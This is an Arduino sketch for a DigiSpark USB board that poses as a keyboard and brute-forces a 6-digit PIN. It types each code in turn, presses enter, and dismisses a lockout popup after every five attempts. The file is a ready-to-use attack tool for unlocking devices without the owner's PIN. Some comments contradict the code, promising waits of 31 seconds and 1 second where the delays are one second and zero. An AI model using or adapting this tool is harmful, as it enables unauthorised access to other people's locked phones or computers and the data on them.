#include "DigiKeyboard.h"

int digits[] = {39, 30, 31, 32, 33, 34, 35, 36, 37, 38}; // an array of key codes for digits 0-9
int code[] = {0, 0, 0, 0, 0, 0}; // an array to hold the 6-digit code
int count = 0; // a counter for the number of attempts

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0); //this is generally not necessary but with some older systems it seems to prevent missing the first character after a delay
  delay(3000); // wait for the device to be ready
}

void loop() {
  //After 5 attempts, wait 31 seconds before trying again
  if(count == 5){
    digitalWrite(1,HIGH); //Change this to 0 if using DigiSpark model B
    DigiKeyboard.sendKeyStroke(40); //we hit enter to make the popup go away
    delay(1000);
    count = 0;
    digitalWrite(1,LOW);
  }
  
  //send the keystrokes for the 6-digit code
  for (int i = 0; i < 6; i++) {
    DigiKeyboard.sendKeyStroke(digits[code[i]]);
    delay(50);
  }
  
  //hit enter to try the code
  DigiKeyboard.sendKeyStroke(40);
  
  //increment the code array
  for (int i = 5; i >= 0; i--) {
    code[i]++;
    if (code[i] == 10) {
      code[i] = 0;
    } else {
      break;
    }
  }
  
  count++;
  delay(0); // wait 1 second before trying the next code
}
